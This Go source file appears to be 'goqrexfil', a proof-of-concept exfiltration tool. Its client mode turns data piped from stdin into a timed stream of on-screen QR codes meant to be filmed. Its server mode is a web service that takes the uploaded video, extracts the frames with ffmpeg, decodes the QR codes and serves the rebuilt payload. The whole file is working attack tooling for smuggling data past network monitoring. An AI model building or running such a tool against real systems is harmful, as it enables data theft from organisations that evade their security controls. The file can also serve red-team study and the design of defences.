package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"image"
	"image/jpeg"
	"image/png"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kjk/smaz"

	"github.com/boombuler/barcode"
	"github.com/boombuler/barcode/qr"
	"github.com/gin-gonic/gin"
	goqr "github.com/liyue201/goqr"
	log "github.com/sirupsen/logrus"
	"github.com/zserge/lorca"
	"golang.org/x/crypto/blake2b"
)

const (
	serverPort        = "9999"                     // TCP port to run the web service on
	videoLocation     = "./public/video.mp4"       // location of video uploaded to the web service
	ffmpeg            = "/opt/homebrew/bin/ffmpeg" // Path to local FFMPEG - required only for server mode
	ffmpegQuality     = "16"                       // Qualify for frames to images conversion. 1-31. 5 for great, 10 for acceptable (this helps reduce file size)
	ffmpegImageScale  = "scale=500:-1"             // Scale for frames to images conversion. 500px + keep aspect ratio
	QRCDataMaxBytes   = 320                        // 230 was safe. If this gets too big, QR code will be hard to read...
	secsBeforeDisplay = 3                          // 3 seconds before starting to display QR codes
	msBetweenFrames   = 550                        // milleseconds between QR codes displayed to allow proper recording
	retrieved         = "./payload/payload.bin"    // path to output payload file when video and all qr code data is retrieved
)

func init() {
	var clear map[string]func()
	clear = make(map[string]func()) //Initialize it
	clear["linux"] = func() {
		cmd := exec.Command("clear") //Linux example, its tested
		cmd.Stdout = os.Stdout
		err := cmd.Run()
		if err != nil {
			log.Fatal(err)
		}
	}
	clear["windows"] = func() {
		cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested
		cmd.Stdout = os.Stdout
		err := cmd.Run()
		if err != nil {
			log.Fatal(err)
		}
	}
	clear["darwin"] = func() {
		cmd := exec.Command("clear") //Linux example, its tested
		cmd.Stdout = os.Stdout
		err := cmd.Run()
		if err != nil {
			log.Fatal(err)
		}
	}
}

// RenderQR returns a QR code HTML image with encoded chunk as data
func RenderQR(chunk string) string {
	qrCode, _ := qr.Encode(chunk, qr.H, qr.Unicode)
	qrCode, _ = barcode.Scale(qrCode, 600, 600)
	var buff bytes.Buffer
	err := png.Encode(&buff, qrCode)
	if err != nil {
		log.Fatal(err)
	}
	encodedString := base64.StdEncoding.EncodeToString(buff.Bytes())
	h := blake2b.Sum256([]byte(chunk))
	fmt.Println("[*] Creating QR code\n   DATA_HASH =", hex.EncodeToString(h[:])) //, "\n    Payload =", []byte(chunk))
	return "<img src=\"data:image/png;base64," + encodedString + "\" />"
}

// payloadInChunks cuts a string payload into multiple chunks of chunkSize size
func payloadInChunks(longString string, chunkSize int) []string {
	var slices []string
	lastIndex := 0
	lastI := 0
	for i := range longString {
		if i-lastIndex > chunkSize {
			slices = append(slices, longString[lastIndex:lastI])
			lastIndex = lastI
		}
		lastI = i
	}
	// handle the leftovers at the end
	if len(longString)-lastIndex > chunkSize {
		slices = append(slices, longString[lastIndex:lastIndex+chunkSize], longString[lastIndex+chunkSize:])
	} else {
		slices = append(slices, longString[lastIndex:])
	}
	return slices
}

// DecodeQRCode returns a string with the base64 encoded payload from the QR code
func DecodeQRCode(img image.Image) string {
	buf := new(bytes.Buffer)
	err := jpeg.Encode(buf, img, nil)
	img, _, err = image.Decode(bytes.NewReader(buf.Bytes()))
	if err != nil {
		log.Error("image.Decode error: %v\n", err)
		return ""
	}
	qrCodes, err := goqr.Recognize(img)
	if err != nil {
		// log.Error("Recognize failed: %v\n", err)
		return ""
	}
	var payload string
	for _, qrCode := range qrCodes {
		payload = payload + string(qrCode.Payload)
	}
	return payload
}

/* retrievePayload is the main function that will take the uploaded video,
will extract frames and will call DecodeQRCode() to get the payload.
it will also concatenate all pieces and finally return the full payload. */
func retrievePayload() bool {
	// Split video into frames using ffmpeg. Ideally it should be a module and not an exec.command call
	files, err := filepath.Glob("./public/*png")
	if err != nil {
		panic(err)
	}
	fmt.Println("[***] Cleaning old files and extracting video frames")
	for _, f := range files {
		if err := os.Remove(f); err != nil {
			panic(err)
		}
	}

	cmd := exec.Command(ffmpeg, "-i", videoLocation,
		"-loglevel", "error", // "-r", "10",
		"-qscale:v", ffmpegQuality,
		"-vf", ffmpegImageScale,
		"-vsync", "vfr",
		"./public/%03d.png")
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	// Now we need to parse all frames, find if a QR Code is present and extract data from it
	var payload string
	matches, _ := filepath.Glob("./public/*png")
	fmt.Println("[***] Extracting data from", len(matches), "frames, skipping duplicates")
	for _, match := range matches {
		f, _ := os.Open(match)
		img, _, _ := image.Decode(f)
		_ = f.Close()
		buff := DecodeQRCode(img)
		if len(buff) == 0 {
			//fmt.Println("[*] Retrieving image from file", match, "- No QR code/data, skipping.")
		} else {
			result := buff
			if len(result) > 0 {
				// in case two frames have same QR code and data
				duplicate := strings.Contains(payload, result)
				if duplicate == false {
					payload += result
					h := blake2b.Sum256([]byte(result))
					// fmt.Println("[*] Creating QRcode,\n   DATA_HASH ="
					fmt.Println("[*] Retrieving data from detected QR code in", match, "\n     DATA_HASH =", hex.EncodeToString(h[:])) //,
					// "\n    Payload =", []byte(result))
				}
			}
		}
	}

	var result = true
	if len(payload) > 0 {
		decoded, _ := base64.StdEncoding.DecodeString(payload)
		decompressed, _ := smaz.Decode(nil, decoded)
		writePayloadFile(decompressed, retrieved)
		h := blake2b.Sum256(decompressed) // content
		fmt.Println("[*] Payload saved as ", retrieved, "\nPayload hash", hex.EncodeToString(h[:]))
	} else {
		log.Info("!!! No Payload retrieved from analyzed frames")
		result = false
	}
	return result
}

func webService() {
	gin.SetMode("release")
	//router := gin.Default()
	router := gin.New()
	router.Static("/process", "./public")
	router.GET("/payload", func(c *gin.Context) {
		// Source
		f, err := os.Open(retrieved)
		if err != nil {
			log.Fatal(err)
		}
		defer func(f *os.File) {
			err := f.Close()
			if err != nil {

			}
		}(f)
		//Seems these headers needed for some browsers (for example without this headers Chrome will download files as txt)
		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", "attachment; filename="+retrieved)
		c.Header("Content-Type", "application/octet-stream")
		c.File(retrieved)
	})
	// upload will get a file and save it in ./Public
	// test: curl -F 'file=@./1.jpg' http://localhost:9999/upload
	router.POST("/upload", func(c *gin.Context) {
		// Source
		file, err := c.FormFile("file")
		if err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("get form err: %s", err.Error()))
			return
		}

		if err := c.SaveUploadedFile(file, videoLocation); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
			return
		}
		log.Println("\n[*] File received")

		// processing
		result := retrievePayload()
		myLink := "<b>No payload retrieved.</b>"
		if result {
			myLink = "<a href='/payload'>download payload</a>"
		}
		_, err = c.Writer.Write([]byte(myLink))
		if err != nil {
			log.Fatal("Cannot serve back the payload file")
		}
		return
	})
	log.Info("Serving on port ", serverPort)
	router.Run(":" + serverPort)
}

func writePayloadFile(payload []byte, filename string) {
	err := os.Remove(filename)
	if err != nil {
		fmt.Println("\n[I] No previous payload file found")
	} else {
		fmt.Println("\n[I] Deleted previous payload file")
	}
	// Open a new file for writing only
	file, err := os.OpenFile(
		filename,
		os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
		0666,
	)
	if err != nil {
		log.Fatal(err)
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	// Write bytes to file
	_, err = file.Write(payload)
	if err != nil {
		log.Fatal(err)
	}
}

//goland:noinspection ALL
func main() {
	log.SetFormatter(&log.TextFormatter{
		DisableColors: false,
		FullTimestamp: true,
	})
	log.SetFormatter(&log.TextFormatter{})
	isServer := flag.Bool("server", false, "Server mode")
	isClient := flag.Bool("client", false, "client mode")
	isProcessing := flag.Bool("retrievePayload", false, "processing existing video only (debug mode)")
	flag.Parse()

	if *isProcessing {
		log.Println("Processing only - DEBUG MODE")
		_ = retrievePayload()
	} else if *isServer {
		// webService mode (retrieving data from video)
		fmt.Println("[*] Server mode: ON")
		webService()
	} else if *isClient {
		// Client mode (allowing video recording of QR codes)
		fmt.Println("[***] Client mode: ON")
		writeText, err := os.Open(os.DevNull)
		if err != nil {
			log.Fatalf("failed to open a null device: %s", err)
		}
		defer writeText.Close()
		io.WriteString(writeText, "Write Text")

		fmt.Println("[*] Loading payload from file")
		readText, err := ioutil.ReadAll(os.Stdin)
		h := blake2b.Sum256([]byte(readText))
		fmt.Println("Plaintext hash", hex.EncodeToString(h[:]))
		if err != nil {
			log.Fatalf("failed to open a null device: %s", err)
		}
		if len(readText) == 0 {
			log.Fatalf("No data read from stdin")
		}
		// Compress, encode, payload in chunks then display the QrCodes
		compressed := smaz.Encode(nil, readText)
		encoded := base64.StdEncoding.EncodeToString(compressed)
		chunks := payloadInChunks(encoded, QRCDataMaxBytes)
		fmt.Println("\n[*] Payload will be in", len(chunks), "chunks")
		fmt.Println("[***] Start your video, displaying in >", secsBeforeDisplay, "< seconds ****")
		fmt.Println()
		time.Sleep(secsBeforeDisplay * time.Second)
		// Create UI with basic HTML passed via data URI
		const html = `
		<html>
			<head><title>goqrexfil PoC</title></head>
			<h1>QR codes streaming starting now</h1>
			</body>
		</html>
		`
		ui, error := lorca.New("data:text/html,"+url.PathEscape(html), "", 675, 675)
		if error != nil {
			log.Fatal("lorca.New():", err)
		}
		defer ui.Close()

		// Iterate on chunks, generate QR code and display it in UI
		for _, chunk := range chunks {
			time.Sleep(msBetweenFrames * time.Millisecond) // need some delays to allow video recording and avoid loosing a frame
			ui.Load("data:text/html," + url.PathEscape(`<html><body><center>`+RenderQR(chunk)+`</center></body></html>`))
		}
		time.Sleep(msBetweenFrames * time.Millisecond)
		ui.Load("data:text/html," + url.PathEscape(`<html><body><h1>Done</h1></body></html>`))
		<-ui.Done()

	} else {
		fmt.Println("Please use client or server mode:")
		fmt.Println("echo \"data to send\" | ./qr --client\t\tTo use in client mode")
		fmt.Println("./goqrexfil --server\t\t\t\t\tTo use as a TLS listener to receive video and retrieve payload.")
		fmt.Println()
		os.Exit(1)
	}
}
